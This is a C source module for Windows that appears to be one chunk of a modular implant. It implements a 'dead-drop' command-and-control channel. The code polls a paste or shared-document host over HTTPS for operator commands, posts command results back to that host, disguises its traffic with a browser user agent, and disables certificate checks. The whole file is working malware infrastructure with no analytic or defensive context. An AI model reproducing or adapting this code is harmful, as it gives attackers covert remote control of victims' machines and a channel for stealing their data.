// chunk: c2/dead_drop_cloud
// depends: core/emit_buffer
// provides: c2_connect, c2_recv_cmd, c2_send_result, c2_disconnect
// headers: windows.h, winhttp.h
// libs: winhttp
// note: Cloud dead-drop C2 — poll shared doc/paste for commands, post results

#ifndef CHUNK_C2_DEAD_DROP
#define CHUNK_C2_DEAD_DROP

#include <winhttp.h>

static HINTERNET g_dd_session = NULL;
static char g_dd_host[256];
static wchar_t g_dd_whost[256];
static char g_dd_id[32];

static int c2_connect(const char *host, int port) {
    (void)port;
    strncpy(g_dd_host, host, sizeof(g_dd_host) - 1);
    MultiByteToWideChar(CP_UTF8, 0, host, -1, g_dd_whost, 256);

    g_dd_session = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                                WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!g_dd_session) return 0;

    snprintf(g_dd_id, sizeof(g_dd_id), "%08lx", GetTickCount());
    return 1;
}

static int c2_recv_cmd(char *buf, int buf_sz) {
    if (!g_dd_session) return 0;

    HINTERNET conn = WinHttpConnect(g_dd_session, g_dd_whost,
                                     INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!conn) return 0;

    wchar_t path[256];
    wchar_t wid[32];
    MultiByteToWideChar(CP_UTF8, 0, g_dd_id, -1, wid, 32);
    swprintf(path, 256, L"/raw/%s", wid);

    HINTERNET req = WinHttpOpenRequest(conn, L"GET", path, NULL,
                                        WINHTTP_NO_REFERER,
                                        WINHTTP_DEFAULT_ACCEPT_TYPES,
                                        WINHTTP_FLAG_SECURE);
    if (!req) { WinHttpCloseHandle(conn); return 0; }

    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    WinHttpSetOption(req, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    int total = 0;
    if (WinHttpSendRequest(req, NULL, 0, NULL, 0, 0, 0) &&
        WinHttpReceiveResponse(req, NULL)) {
        DWORD read_bytes;
        while (WinHttpReadData(req, buf + total, (DWORD)(buf_sz - total - 1), &read_bytes) && read_bytes > 0)
            total += (int)read_bytes;
    }
    buf[total] = '\0';

    WinHttpCloseHandle(req);
    WinHttpCloseHandle(conn);
    return total;
}

static int c2_send_result(const char *data, int len) {
    if (!g_dd_session) return 0;

    HINTERNET conn = WinHttpConnect(g_dd_session, g_dd_whost,
                                     INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!conn) return 0;

    HINTERNET req = WinHttpOpenRequest(conn, L"POST", L"/api/v1/paste",
                                        NULL, WINHTTP_NO_REFERER,
                                        WINHTTP_DEFAULT_ACCEPT_TYPES,
                                        WINHTTP_FLAG_SECURE);
    if (!req) { WinHttpCloseHandle(conn); return 0; }

    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA;
    WinHttpSetOption(req, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    int result = 0;
    if (WinHttpSendRequest(req,
            L"Content-Type: application/octet-stream\r\n", -1L,
            (LPVOID)data, (DWORD)len, (DWORD)len, 0) &&
        WinHttpReceiveResponse(req, NULL)) {
        result = 1;
    }

    WinHttpCloseHandle(req);
    WinHttpCloseHandle(conn);
    return result;
}

static void c2_disconnect(void) {
    if (g_dd_session) {
        WinHttpCloseHandle(g_dd_session);
        g_dd_session = NULL;
    }
}

#endif
